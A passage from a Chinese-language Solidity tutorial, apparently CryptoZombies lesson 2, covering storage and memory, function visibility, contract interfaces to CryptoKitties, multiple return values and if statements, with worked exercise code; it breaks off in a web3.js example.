<code>memory</code>。</p><p><strong>Storage</strong> 变量是指**<u>永久存储</u><strong>在区块链中的变量。 <strong>Memory</strong> 变量则是</strong><u>临时的</u>**，当外部函数对某合约调用完成时，内存型变量即被移除。 你可以把它想象成存储在你电脑的硬盘或是RAM中数据的关系。</p><p>大多数时候你都用不到这些关键字，默认情况下 Solidity 会自动处理它们。 状态变量（在函数之外声明的变量）默认为“存储”形式，并永久写入区块链；而在函数内部声明的变量是“内存”型的，它们函数调用结束后消失。</p><p>然而也有一些情况下，你需要手动声明存储类型，主要用于处理函数内的 <strong>结构体</strong> 和 <strong>数组</strong> 时：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract SandwichFactory {</span><br><span class="line">  struct Sandwich {</span><br><span class="line">    string name;</span><br><span class="line">    string status;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  Sandwich[] sandwiches;</span><br><span class="line"></span><br><span class="line">  function eatSandwich(uint _index) public {</span><br><span class="line">    // Sandwich mySandwich = sandwiches[_index];</span><br><span class="line"></span><br><span class="line">    // ^ 看上去很直接，不过 Solidity 将会给出警告</span><br><span class="line">    // 告诉你应该明确在这里定义 `storage` 或者 `memory`。</span><br><span class="line"></span><br><span class="line">    // 所以你应该明确定义 `storage`:</span><br><span class="line">    Sandwich storage mySandwich = sandwiches[_index];</span><br><span class="line">    // ...这样 `mySandwich` 是指向 `sandwiches[_index]`的指针</span><br><span class="line">    // 在存储里，另外...</span><br><span class="line">    mySandwich.status = "Eaten!";</span><br><span class="line">    // ...这将永久把 `sandwiches[_index]` 变为区块链上的存储</span><br><span class="line"></span><br><span class="line">    // 如果你只想要一个副本，可以使用`memory`:</span><br><span class="line">    Sandwich memory anotherSandwich = sandwiches[_index + 1];</span><br><span class="line">    // ...这样 `anotherSandwich` 就仅仅是一个内存里的副本了</span><br><span class="line">    // 另外</span><br><span class="line">    anotherSandwich.status = "Eaten!";</span><br><span class="line">    // ...将仅仅修改临时变量，对 `sandwiches[_index + 1]` 没有任何影响</span><br><span class="line">    // 不过你可以这样做:</span><br><span class="line">    sandwiches[_index + 1] = anotherSandwich;</span><br><span class="line">    // ...如果你想把副本的改动保存回区块链存储</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果你还没有完全理解究竟应该使用哪一个，也不用担心 —— 在本教程中，我们将告诉你何时使用 <code>storage</code> 或是 <code>memory</code>，并且当你不得不使用到这些关键字的时候，Solidity 编译器也发警示提醒你的。</p><p>现在，只要知道在某些场合下也需要你显式地声明 <code>storage</code> 或 <code>memory</code>就够了！</p><p><strong>实战演习</strong></p><p>是时候给我们的僵尸增加“猎食”和“繁殖”功能了！</p><p>当一个僵尸猎食其他生物体时，它自身的DNA将与猎物生物的DNA结合在一起，形成一个新的僵尸DNA。</p><ol><li>创建一个名为 <code>feedAndMultiply</code> 的函数。 使用两个参数：<code>_zombieId</code>（ <code>uint</code>类型 ）和<code>_targetDna</code> （也是 <code>uint</code> 类型）。 设置属性为 <code>public</code> 的。</li><li>我们不希望别人用我们的僵尸去捕猎。 首先，我们确保对自己僵尸的所有权。 通过添加一个<code>require</code> 语句来确保 <code>msg.sender</code> 只能是这个僵尸的主人（类似于我们在 <code>createRandomZombie</code> 函数中做过的那样）。</li></ol><blockquote><p>注意：同样，因为我们的答案检查器比较呆萌，只认识把 <code>msg.sender</code> 放在前面的答案，如果你切换了参数的顺序，它就不认得了。 但你正常编码时，如何安排参数顺序都是正确的。</p></blockquote><ol><li>为了获取这个僵尸的DNA，我们的函数需要声明一个名为 <code>myZombie</code> 数据类型为<code>Zombie</code>的本地变量（这是一个 <code>storage</code> 型的指针）。 将其值设定为在 <code>zombies</code> 数组中索引为<code>_zombieId</code>所指向的值。</li></ol><p>到目前为止，包括函数结束符 <code>}</code> 的那一行， 总共4行代码。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Start here</span><br><span class="line">    function feedAndMultiply(uint _zombieId, uint _targetDna) public{</span><br><span class="line">        require(msg.sender == zombieToOwner[_zombieId]);</span><br><span class="line">        Zombie storage myZombie = zombies[_zombieId];</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="第8章-僵尸的DNA"><a href="#第8章-僵尸的DNA" class="headerlink" title="第8章: 僵尸的DNA"></a>第8章: 僵尸的DNA</h3><p>我们来把 <code>feedAndMultiply</code> 函数写完吧。</p><p>获取新的僵尸DNA的公式很简单：计算猎食僵尸DNA和被猎僵尸DNA之间的平均值。</p><p>例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function testDnaSplicing() public {</span><br><span class="line">  uint zombieDna = 2222222222222222;</span><br><span class="line">  uint targetDna = 4444444444444444;</span><br><span class="line">  uint newZombieDna = (zombieDna + targetDna) / 2;</span><br><span class="line">  // newZombieDna 将等于 3333333333333333</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>以后，我们也可以让函数变得更复杂些，比方给新的僵尸的 DNA 增加一些随机性之类的。但现在先从最简单的开始 —— 以后还可以回来完善它嘛。</p><p><strong>实战演习</strong></p><ol><li>首先我们确保 <code>_targetDna</code> 不长于16位。要做到这一点，我们可以设置 <code>_targetDna</code> 为 <code>_targetDna ％ dnaModulus</code> ，并且只取其最后16位数字。</li><li>接下来为我们的函数声明一个名叫 <code>newDna</code> 的 <code>uint</code>类型的变量，并将其值设置为 <code>myZombie</code>的 DNA 和 <code>_targetDna</code> 的平均值（如上例所示）。</li></ol><blockquote><p>注意：您可以用 <code>myZombie.name</code> 或 <code>myZombie.dna</code> 访问 <code>myZombie</code> 的属性。</p></blockquote><ol><li>一旦我们计算出新的DNA，再调用 <code>_createZombie</code> 就可以生成新的僵尸了。如果你忘了调用这个函数所需要的参数，可以查看 <code>zombiefactory.sol</code> 选项卡。请注意，需要先给它命名，所以现在我们把新的僵尸的名字设为<code>NoName</code> - 我们回头可以编写一个函数来更改僵尸的名字。</li></ol><blockquote><p>注意：对于 Solidity 高手，你可能会注意到我们的代码存在一个问题。别担心，下一章会解决这个问题的 ;）</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function feedAndMultiply(uint _zombieId, uint _targetDna) public {</span><br><span class="line">    require(msg.sender == zombieToOwner[_zombieId]);</span><br><span class="line">    Zombie storage myZombie = zombies[_zombieId];</span><br><span class="line">    // start here</span><br><span class="line">    _targetDna = _targetDna % dnaModulus;</span><br><span class="line">    uint newDna = (myZombie.dna + _targetDna) / 2;</span><br><span class="line">    _createZombie("NoName", newDna);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h3 id="第9章-更多关于函数可见性"><a href="#第9章-更多关于函数可见性" class="headerlink" title="第9章: 更多关于函数可见性"></a>第9章: 更多关于函数可见性</h3><p><strong>我们上一课的代码有问题！</strong></p><p>编译的时候编译器就会报错。</p><p>错误在于，我们尝试从 <code>ZombieFeeding</code> 中调用 <code>_createZombie</code> 函数，但 <code>_createZombie</code> 却是 <code>ZombieFactory</code> 的 <code>private</code> （私有）函数。这意味着任何继承自 <code>ZombieFactory</code> 的子合约都不能访问它。</p><p><strong>internal 和 external</strong></p><p>除 <code>public</code> 和 <code>private</code> 属性之外，Solidity 还使用了另外两个描述函数可见性的修饰词：<code>internal</code>（内部） 和 <code>external</code>（外部）。</p><p><code>internal</code> 和 <code>private</code> 类似，不过， 如果某个合约继承自其父合约，这个合约即可以访问父合约中定义的“内部”函数。（嘿，这听起来正是我们想要的那样！）。</p><p><code>external</code> 与<code>public</code> 类似，只不过这些函数只能在合约之外调用 - 它们不能被合约内的其他函数调用。稍后我们将讨论什么时候使用 <code>external</code> 和 <code>public</code>。</p><p>声明函数 <code>internal</code> 或 <code>external</code> 类型的语法，与声明 <code>private</code> 和 <code>public</code>类 型相同：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract Sandwich {</span><br><span class="line">  uint private sandwichesEaten = 0;</span><br><span class="line"></span><br><span class="line">  function eat() internal {</span><br><span class="line">    sandwichesEaten++;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract BLT is Sandwich {</span><br><span class="line">  uint private baconSandwichesEaten = 0;</span><br><span class="line"></span><br><span class="line">  function eatWithBacon() public returns (string) {</span><br><span class="line">    baconSandwichesEaten++;</span><br><span class="line">    // 因为eat() 是internal 的，所以我们能在这里调用</span><br><span class="line">    eat();</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><ol><li><p>将 <code>_createZombie()</code> 函数的属性从 <code>private</code> 改为 <code>internal</code> ， 使得其他的合约也能访问到它。</p><p> 我们已经成功把你的注意力集中在到<code>zombiefactory.sol</code>这个选项卡上啦。</p></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 在这里修改函数的功能</span><br><span class="line">    function _createZombie(string _name, uint _dna) internal {</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - 1;</span><br><span class="line">        zombieToOwner[id] = msg.sender;</span><br><span class="line">        ownerZombieCount[msg.sender]++;</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="第10章-僵尸吃什么"><a href="#第10章-僵尸吃什么" class="headerlink" title="第10章: 僵尸吃什么?"></a>第10章: 僵尸吃什么?</h3><p>是时候让我们的僵尸去捕猎！ 那僵尸最喜欢的食物是什么呢？</p><p>Crypto 僵尸喜欢吃的是…</p><p><strong>CryptoKitties！</strong> 😱😱😱</p><p>（正经点，我可不是开玩笑😆）</p><p>为了做到这一点，我们要读出 CryptoKitties 智能合约中的 kittyDna。这些数据是公开存储在区块链上的。区块链是不是很酷？</p><p>别担心 —— 我们的游戏并不会伤害到任何真正的CryptoKitty。 我们只 <em>读取</em> CryptoKitties 数据，但却无法在物理上删除它。</p><p><strong>与其他合约的交互</strong></p><p>如果我们的合约需要和区块链上的其他的合约会话，则需先定义一个 <strong>interface</strong> (接口)。</p><p>先举一个简单的栗子。 假设在区块链上有这么一个合约：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract LuckyNumber {</span><br><span class="line">  mapping(address =&gt; uint) numbers;</span><br><span class="line"></span><br><span class="line">  function setNum(uint _num) public {</span><br><span class="line">    numbers[msg.sender] = _num;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  function getNum(address _myAddress) public view returns (uint) {</span><br><span class="line">    return numbers[_myAddress];</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这是个很简单的合约，您可以用它存储自己的幸运号码，并将其与您的以太坊地址关联。 这样其他人就可以通过您的地址查找您的幸运号码了。</p><p>现在假设我们有一个外部合约，使用 <code>getNum</code> 函数可读取其中的数据。</p><p>首先，我们定义 <code>LuckyNumber</code> 合约的 <strong>interface</strong> ：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract NumberInterface {</span><br><span class="line">  function getNum(address _myAddress) public view returns (uint);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>请注意，这个过程虽然看起来像在定义一个合约，但其实内里不同：</p><p>首先，我们只声明了要与之交互的函数 —— 在本例中为 <code>getNum</code> —— 在其中我们没有使用到任何其他的函数或状态变量。</p><p>其次，我们并没有使用大括号（<code>{</code> 和 <code>}</code>）定义函数体，我们单单用分号（<code>;</code>）结束了函数声明。这使它看起来像一个合约框架。</p><p>编译器就是靠这些特征认出它是一个接口的。</p><p>在我们的 app 代码中使用这个接口，合约就知道其他合约的函数是怎样的，应该如何调用，以及可期待什么类型的返回值。</p><p>在下一课中，我们将真正调用其他合约的函数。目前我们只要声明一个接口，用于调用 CryptoKitties 合约就行了。</p><p><strong>实战演习</strong></p><p>我们已经为你查看过了 CryptoKitties 的源代码，并且找到了一个名为 <code>getKitty</code>的函数，它返回所有的加密猫的数据，包括它的“基因”（我们的僵尸游戏要用它生成新的僵尸）。</p><p>该函数如下所示：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function getKitty(uint256 _id) external view returns (</span><br><span class="line">    bool isGestating,</span><br><span class="line">    bool isReady,</span><br><span class="line">    uint256 cooldownIndex,</span><br><span class="line">    uint256 nextActionAt,</span><br><span class="line">    uint256 siringWithId,</span><br><span class="line">    uint256 birthTime,</span><br><span class="line">    uint256 matronId,</span><br><span class="line">    uint256 sireId,</span><br><span class="line">    uint256 generation,</span><br><span class="line">    uint256 genes</span><br><span class="line">) {</span><br><span class="line">    Kitty storage kit = kitties[_id];</span><br><span class="line"></span><br><span class="line">    // if this variable is 0 then it's not gestating</span><br><span class="line">    isGestating = (kit.siringWithId != 0);</span><br><span class="line">    isReady = (kit.cooldownEndBlock &lt;= block.number);</span><br><span class="line">    cooldownIndex = uint256(kit.cooldownIndex);</span><br><span class="line">    nextActionAt = uint256(kit.cooldownEndBlock);</span><br><span class="line">    siringWithId = uint256(kit.siringWithId);</span><br><span class="line">    birthTime = uint256(kit.birthTime);</span><br><span class="line">    matronId = uint256(kit.matronId);</span><br><span class="line">    sireId = uint256(kit.sireId);</span><br><span class="line">    generation = uint256(kit.generation);</span><br><span class="line">    genes = kit.genes;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个函数看起来跟我们习惯的函数不太一样。 它竟然返回了…一堆不同的值！ 如果您用过 JavaScript 之类的编程语言，一定会感到奇怪 —— 在 Solidity中，您可以让一个函数返回多个值。</p><p>现在我们知道这个函数长什么样的了，就可以用它来创建一个接口：</p><p>1.定义一个名为 <code>KittyInterface</code> 的接口。 请注意，因为我们使用了 <code>contract</code> 关键字， 这过程看起来就像创建一个新的合约一样。</p><p>2.在interface里定义了 <code>getKitty</code> 函数（不过是复制/粘贴上面的函数，但在 <code>returns</code> 语句之后用分号，而不是大括号内的所有内容。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Create KittyInterface here</span><br><span class="line">contract KittyInterface {</span><br><span class="line">    function getKitty(uint256 _id) external view returns (</span><br><span class="line">    bool isGestating,</span><br><span class="line">    bool isReady,</span><br><span class="line">    uint256 cooldownIndex,</span><br><span class="line">    uint256 nextActionAt,</span><br><span class="line">    uint256 siringWithId,</span><br><span class="line">    uint256 birthTime,</span><br><span class="line">    uint256 matronId,</span><br><span class="line">    uint256 sireId,</span><br><span class="line">    uint256 generation,</span><br><span class="line">    uint256 genes</span><br><span class="line">    );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第11章-使用接口"><a href="#第11章-使用接口" class="headerlink" title="第11章: 使用接口"></a>第11章: 使用接口</h3><p>继续前面 <code>NumberInterface</code> 的例子，我们既然将接口定义为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract NumberInterface {</span><br><span class="line">  function getNum(address _myAddress) public view returns (uint);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们可以在合约中这样使用：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract MyContract {</span><br><span class="line">  address NumberInterfaceAddress = 0xab38...;</span><br><span class="line">  // ^ 这是FavoriteNumber合约在以太坊上的地址</span><br><span class="line">  NumberInterface numberContract = NumberInterface(NumberInterfaceAddress);</span><br><span class="line">  // 现在变量 `numberContract` 指向另一个合约对象</span><br><span class="line"></span><br><span class="line">  function someFunction() public {</span><br><span class="line">    // 现在我们可以调用在那个合约中声明的 `getNum`函数:</span><br><span class="line">    uint num = numberContract.getNum(msg.sender);</span><br><span class="line">    // ...在这儿使用 `num`变量做些什么</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>通过这种方式，只要将您合约的可见性设置为<code>public</code>(公共)或<code>external</code>(外部)，它们就可以与以太坊区块链上的任何其他合约进行交互。</p><p><strong>实战演习</strong></p><p>我们来建个自己的合约去读取另一个智能合约– CryptoKitties 的内容吧！</p><ol><li>我已经将代码中 CryptoKitties 合约的地址保存在一个名为 <code>ckAddress</code> 的变量中。在下一行中，请创建一个名为 <code>kittyContract</code> 的 KittyInterface，并用 <code>ckAddress</code> 为它初始化 —— 就像我们为 <code>numberContract</code>所做的一样。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract ZombieFeeding is ZombieFactory {</span><br><span class="line"></span><br><span class="line">  address ckAddress = 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d;</span><br><span class="line">  // Initialize kittyContract here using `ckAddress` from above</span><br><span class="line">    KittyInterface kittyContract = KittyInterface(ckAddress);</span><br><span class="line"></span><br><span class="line">  function feedAndMultiply(uint _zombieId, uint _targetDna) public {</span><br><span class="line">    require(msg.sender == zombieToOwner[_zombieId]);</span><br><span class="line">    Zombie storage myZombie = zombies[_zombieId];</span><br><span class="line">    _targetDna = _targetDna % dnaModulus;</span><br><span class="line">    uint newDna = (myZombie.dna + _targetDna) / 2;</span><br><span class="line">    _createZombie("NoName", newDna);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第12章-处理多返回值"><a href="#第12章-处理多返回值" class="headerlink" title="第12章: 处理多返回值"></a>第12章: 处理多返回值</h3><p><code>getKitty</code> 是我们所看到的第一个返回多个值的函数。我们来看看是如何处理的：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function multipleReturns() internal returns(uint a, uint b, uint c) {</span><br><span class="line">  return (1, 2, 3);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function processMultipleReturns() external {</span><br><span class="line">  uint a;</span><br><span class="line">  uint b;</span><br><span class="line">  uint c;</span><br><span class="line">  // 这样来做批量赋值:</span><br><span class="line">  (a, b, c) = multipleReturns();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 或者如果我们只想返回其中一个变量:</span><br><span class="line">function getLastReturnValue() external {</span><br><span class="line">  uint c;</span><br><span class="line">  // 可以对其他字段留空:</span><br><span class="line">  (,,c) = multipleReturns();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>是时候与 CryptoKitties 合约交互起来了！</p><p>我们来定义一个函数，从 kitty 合约中获取它的基因：</p><ol><li><p>创建一个名为 <code>feedOnKitty</code> 的函数。它需要2个 <code>uint</code> 类型的参数，<code>_zombieId</code> 和<code>_kittyId</code> ，这是一个 <code>public</code> 类型的函数。</p></li><li><p>函数首先要声明一个名为 <code>kittyDna</code> 的 <code>uint</code>。</p><blockquote><p>注意：在我们的 <code>KittyInterface</code> 中，<code>genes</code> 是一个 <code>uint256</code> 类型的变量，但是如果你记得，我们在第一课中提到过，<code>uint</code> 是 <code>uint256</code> 的别名，也就是说它们是一回事。</p></blockquote></li><li><p>这个函数接下来调用 <code>kittyContract.getKitty</code>函数, 传入 <code>_kittyId</code> ，将返回的 <code>genes</code> 存储在 <code>kittyDna</code> 中。记住 —— <code>getKitty</code> 会返回一大堆变量。 （确切地说10个 - 我已经为你数过了，不错吧！）。但是我们只关心最后一个– <code>genes</code>。数逗号的时候小心点哦！</p></li><li><p>最后，函数调用了 <code>feedAndMultiply</code> ，并传入了 <code>_zombieId</code> 和 <code>kittyDna</code> 两个参数。</p></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// define function here</span><br><span class="line">    function feedOnKitty(uint _zombieId, uint _kittyId) public{</span><br><span class="line">        uint kittyDna;</span><br><span class="line">        (,,,,,,,,,kittyDna) = kittyContract.getKitty(_kittyId);</span><br><span class="line">        feedAndMultiply(_zombieId,kittyDna);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="第13章-奖励-Kitty-基因"><a href="#第13章-奖励-Kitty-基因" class="headerlink" title="第13章: 奖励: Kitty 基因"></a>第13章: 奖励: Kitty 基因</h3><p>我们的功能逻辑主体已经完成了…现在让我们来添一个奖励功能吧。</p><p>这样吧，给从小猫制造出的僵尸添加些特征，以显示他们是猫僵尸。</p><p>要做到这一点，咱们在新僵尸的DNA中添加一些特殊的小猫代码。</p><p>还记得吗，第一课中我们提到，我们目前只使用16位DNA的前12位数来指定僵尸的外观。所以现在我们可以使用最后2个数字来处理“特殊”的特征。</p><p>这样吧，把猫僵尸DNA的最后两个数字设定为<code>99</code>（因为猫有9条命）。所以在我们这么来写代码：<code>如果</code>这个僵尸是一只猫变来的，就将它DNA的最后两位数字设置为<code>99</code>。</p><p><strong>if 语句</strong></p><p>if语句的语法在 Solidity 中，与在 JavaScript 中差不多：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function eatBLT(string sandwich) public {</span><br><span class="line">  // 看清楚了，当我们比较字符串的时候，需要比较他们的 keccak256 哈希码</span><br><span class="line">  if (keccak256(sandwich) == keccak256("BLT")) {</span><br><span class="line">    eat();</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>让我们在我们的僵尸代码中实现小猫的基因。</p><ol><li><p>首先，我们修改下 <code>feedAndMultiply</code> 函数的定义，给它传入第三个参数：一条名为 <code>_species</code> 的字符串。</p></li><li><p>接下来，在我们计算出新的僵尸的DNA之后，添加一个 <code>if</code> 语句来比较 <code>_species</code> 和字符串 <code>"kitty"</code> 的 <code>keccak256</code> 哈希值。</p></li><li><p>在 <code>if</code> 语句中，我们用 <code>99</code> 替换了新僵尸DNA的最后两位数字。可以这么做：<code>newDna = newDna - newDna % 100 + 99;</code>。</p><blockquote><p>解释：假设 <code>newDna</code> 是 <code>334455</code>。那么 <code>newDna % 100</code> 是 <code>55</code>，所以 <code>newDna - newDna % 100</code> 得到 <code>334400</code>。最后加上 <code>99</code> 可得到 <code>334499</code>。</p></blockquote></li><li><p>最后，我们修改了 <code>feedOnKitty</code> 中的函数调用。当它调用 <code>feedAndMultiply</code> 时，增加 <code>“kitty”</code> 作为最后一个参数。</p></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 这里修改函数定义</span><br><span class="line">  function feedAndMultiply(uint _zombieId, uint _targetDna, string _species) public {</span><br><span class="line">    require(msg.sender == zombieToOwner[_zombieId]);</span><br><span class="line">    Zombie storage myZombie = zombies[_zombieId];</span><br><span class="line">    _targetDna = _targetDna % dnaModulus;</span><br><span class="line">    uint newDna = (myZombie.dna + _targetDna) / 2;</span><br><span class="line">    // 这里增加一个 if 语句</span><br><span class="line">    if(keccak256(_species) == keccak256("kitty")){</span><br><span class="line">        newDna = newDna - newDna % 100 + 99;</span><br><span class="line">    }</span><br><span class="line">    _createZombie("NoName", newDna);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  function feedOnKitty(uint _zombieId, uint _kittyId) public {</span><br><span class="line">    uint kittyDna;</span><br><span class="line">    (,,,,,,,,,kittyDna) = kittyContract.getKitty(_kittyId);</span><br><span class="line">    // 并修改函数调用</span><br><span class="line">    feedAndMultiply(_zombieId, kittyDna,"kitty");</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h3 id="第14章-放在一起"><a href="#第14章-放在一起" class="headerlink" title="第14章: 放在一起"></a>第14章: 放在一起</h3><p>至此，你已经学完第二课了！</p><p>查看下→_→的演示，看看他们怎么运行起来得吧。继续，你肯定等不及看完这一页😉。点击小猫，攻击！看到你斩获一个新的小猫僵尸了吧！</p><p><strong>JavaScript 实现</strong></p><p>我们只用编译和部署 <code>ZombieFeeding</code>，就可以将这个合约部署到以太坊了。我们最终完成的这个合约继承自 <code>ZombieFactory</code>，因此它可以访问自己和父辈合约中的所有 public 方法。</p><p>我们来看一个与我们的刚部署的合约进行交互的例子， 这个例子使用了 JavaScript 和 web3.js：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var abi = /* abi generated by the compiler */</span><br><span class="line">var ZombieFeedingContract = 